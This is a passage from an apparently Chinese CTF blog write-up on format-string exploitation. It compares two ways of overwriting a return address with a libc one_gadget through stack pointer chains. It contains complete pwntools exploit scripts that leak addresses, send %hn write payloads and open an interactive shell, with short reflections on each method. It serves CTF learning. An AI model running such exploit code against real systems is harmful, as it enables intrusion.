class="hljs-string">&quot;one_gadget_4&quot;</span>,one_gadget_4)<br><br><br>location=rbp_16-<span class="hljs-number">8</span><br><br><span class="hljs-comment"># 20位置</span><br>num_1=rbp_16+<span class="hljs-number">80</span><br>num= num_1 &amp; <span class="hljs-number">0xffff</span><br>location_1 = location &amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_1&quot;</span>,location_1)<br><br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># 26位置</span><br>num_2=rbp_16+<span class="hljs-number">128</span><br>num= num_2 &amp; <span class="hljs-number">0xffff</span><br>location_2 = (location + <span class="hljs-number">2</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_2&quot;</span>,location_2)<br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># 30位置</span><br><br>num_3=rbp_16+<span class="hljs-number">160</span><br>num= num_3 &amp; <span class="hljs-number">0xffff</span><br>location_3= (location + <span class="hljs-number">4</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_3&quot;</span>,location_3)<br><br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br>payload = <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) +  <span class="hljs-string">b&quot;c%20$hn&quot;</span> <br>payload += <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span> + one_gadget_2 - one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%26$hn&quot;</span> <br>payload += <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span> + one_gadget_3 - one_gadget_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%30$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 这里没啥意义</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">应该是我环境问题 导致 最后会再发一次payload 为了严谨 可以在每个payload后面补上b&#x27;\x00&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 四次没跑</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>  sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;Kee02p\x00&#x27;</span>)<br>it()<br></code></pre></td></tr></table></figure><blockquote><p>关于这种方法的一点点小思考</p></blockquote><p>这种办法其实并不比常规的诸葛连弩的简单 感觉可能某些情况下 反而更加复杂 而且最后一次打的时候 很可能出现超过规定字节 造成溢出 然后出错 另外在改二链的时候 还可能出现因为占用某个栈位置 导致程序崩溃 但是他在一定特殊情况下可以进行 例如我们需要一次打某个地址的话 不能分开打的时候 他就发挥作用了</p><p> 假如这个返回地址 不能被一个一个的改的时候  会利用跳转的时候 或者我们要改某个一直用的函数的got表的时候 可以一次性把got表改了 不会造成冲突</p><h3 id="二、诸葛连弩"><a href="#二、诸葛连弩" class="headerlink" title="二、诸葛连弩"></a>二、诸葛连弩</h3><blockquote><p>何为诸葛连弩？其实就是在一个地址上不断地改 认准他一个人狠打</p></blockquote><p>这个是比较常见 也比较常规的打法 这里需要我们修改 三连指针以改变 第10个位置 第一次指向ret 然后再修改三连指针 第二次指向ret+2     </p><p>然后第三次再修改三连指针 第三次指向ret+4 一点点改ret的值 这就叫”认准他一个打”</p><p>如下例题演示可以对照如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">content 就是我们要填的内容 也就是one_gadget</span><br><span class="hljs-string">locatione 也就是我们的返回地址ret</span><br><span class="hljs-string">location_1 填 content_1</span><br><span class="hljs-string">location_2 填 content_2</span><br><span class="hljs-string">依次对应</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>[+]content_1---&gt;<span class="hljs-number">0x5226</span><br>[+] content_2---&gt;<span class="hljs-number">0xff84</span><br>[+] content_3---&gt;<span class="hljs-number">0x7fc4</span><br>[+] content_4---&gt;<span class="hljs-number">0x0</span><br>[+] location_1---&gt;<span class="hljs-number">0xc48</span><br>[+] location_2---&gt;<span class="hljs-number">0xc4a</span><br>[+] location_3---&gt;<span class="hljs-number">0xc4c</span><br>[+] location_4---&gt;<span class="hljs-number">0xc4e</span><br></code></pre></td></tr></table></figure><p>初始栈空间如下：</p><p><img src="/../images/format/image-20230805203859513.png" alt="image-20230805203859513"></p><p>修改ret最低两位</p><p>​第一个printf 使0c50–&gt;0c48 </p><p><img src="/../images/format/image-20230805204115181.png" alt="image-20230805204115181"></p><p>​第二个printf 修改0c48里存的内容 也就是修改为one_gadget的后两个字节</p><p><img src="/../images/format/image-20230805204707924.png" alt="image-20230805204707924"></p><p>修改ret次低两位</p><p><img src="/../images/format/image-20230805205444654.png" alt="image-20230805205444654"></p><p>修改ret次次低两位</p><p><img src="/../images/format/image-20230805205547826.png" alt="image-20230805205547826"></p><p>修改ret最高两位</p><p>​高两位都是0 不写也可以 这里省略</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 诸葛连弩</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)    <span class="hljs-comment">#arch=&#x27;amd64&#x27;,arch=&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>it = <span class="hljs-keyword">lambda</span> : p.interactive()<br>b=<span class="hljs-keyword">lambda</span> :gdb.attach(p)<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>get_leaked_libc64_1 = <span class="hljs-keyword">lambda</span> :u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>get_leaked_libc32 = <span class="hljs-keyword">lambda</span> :u32(p.recv(<span class="hljs-number">4</span>))<br>get_leaked_libc64_2 = <span class="hljs-keyword">lambda</span> :u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment"># 普通泄露 当遇到 0a乱入的时候 或者其他没有0的情况</span><br>get_canary = <span class="hljs-keyword">lambda</span>:<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)) <span class="hljs-comment"># 目前可以利用于格式化字符串的 leak</span><br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27526</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    b()<br><br><br><span class="hljs-comment"># 过判断</span><br>payload1=<span class="hljs-string">&quot;TokameinE_is_the_best_pwner\x00&quot;</span><br>sa(<span class="hljs-string">&quot;Do you know who the best pwner is?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 泄露binary</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;%9$p%29$p%8$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>vuln_42=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>binary_base=vuln_42-<span class="hljs-number">42</span>-elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>leak(<span class="hljs-string">&quot;binary_base&quot;</span>,binary_base)<br><br><span class="hljs-comment"># 泄露libc_base</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>start_240=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=start_240-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br><span class="hljs-comment"># 泄露栈地址</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>rbp_16=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>leak(<span class="hljs-string">&quot;rbp_16&quot;</span>,rbp_16)<br><br><br><span class="hljs-comment"># one_gadget</span><br><br>one=[<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>one_gadget=libc_base+one[<span class="hljs-number">0</span>]<br>leak(<span class="hljs-string">&quot;one_gadget&quot;</span>,one_gadget)<br><br>one_gadget_1 = one_gadget &amp; <span class="hljs-number">0xffff</span>  <span class="hljs-comment"># 后两位</span><br>one_gadget_2 = (one_gadget &gt;&gt; <span class="hljs-number">16</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 往前推俩</span><br>one_gadget_3 = (one_gadget &gt;&gt; <span class="hljs-number">32</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 再往前推两位</span><br>one_gadget_4 = (one_gadget &gt;&gt; <span class="hljs-number">48</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 最前面两位</span><br><br>leak(<span class="hljs-string">&quot;one_gadget_1&quot;</span>,one_gadget_1)<br>leak(<span class="hljs-string">&quot;one_gadget_2&quot;</span>,one_gadget_2)<br>leak(<span class="hljs-string">&quot;one_gadget_3&quot;</span>,one_gadget_3)<br>leak(<span class="hljs-string">&quot;one_gadget_4&quot;</span>,one_gadget_4)<br><br><br><span class="hljs-comment"># ret地址</span><br>ret=rbp_16-<span class="hljs-number">8</span><br>ret_1= ret &amp; <span class="hljs-number">0xffff</span><br>ret_2= (ret + <span class="hljs-number">2</span>)&amp; <span class="hljs-number">0xffff</span><br>ret_3= (ret + <span class="hljs-number">4</span>)&amp; <span class="hljs-number">0xffff</span><br>ret_4= (ret + <span class="hljs-number">6</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;ret_1&quot;</span>,ret_1)<br>leak(<span class="hljs-string">&quot;ret_2&quot;</span>,ret_2)<br>leak(<span class="hljs-string">&quot;ret_3&quot;</span>,ret_3)<br>leak(<span class="hljs-string">&quot;ret_4&quot;</span>,ret_4)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第一次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 打第八位为rbp_16-8 也就是改成了rbp</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第二次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 打第八位为rbp_16-8 也就是改成了rbp</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第三次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 第四次</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># payload=b&quot;%&quot; + str(ret_4).encode(&quot;utf-8&quot;) + b&quot;c%8$hn\x00&quot;</span><br><span class="hljs-comment"># sa(&quot;What do you want to say?&quot;,payload)</span><br><span class="hljs-comment"># # 往第十个位置开始写one_gadget</span><br><span class="hljs-comment"># payload=b&quot;%&quot; + str(one_gadget_4).encode(&quot;utf-8&quot;) + b&quot;c%10$hn\x00&quot;</span><br><span class="hljs-comment"># sa(&quot;What do you want to say?&quot;,payload)</span><br><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">这里环境好像有问题 机器会自己再重复打一次最后的 而且会接上这个内容 </span><br><span class="hljs-string">补\x00 让他自己再改一次 其实没啥意义</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 五次没跑</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>  sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;Kee02p\x00&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>关于诸葛连弩的一点思考</p></blockquote><p>比较常规 也容易理解 但是如果程序 一旦出了循环 或者需要使用你改的那块地址的时候 这种方法就会崩溃 因为他需要分很多次 对一个地址 逐位进行改动</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>该文章方法学习于国资师傅</p><p><a href="https://www.freebuf.com/vuls/284210.html">博客</a></p><p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW/?p=32&amp;spm_id_from=pageDriver&amp;vd_source=123d02421ca4cdb59802724ced16b46e">四马分肥</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>格式化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
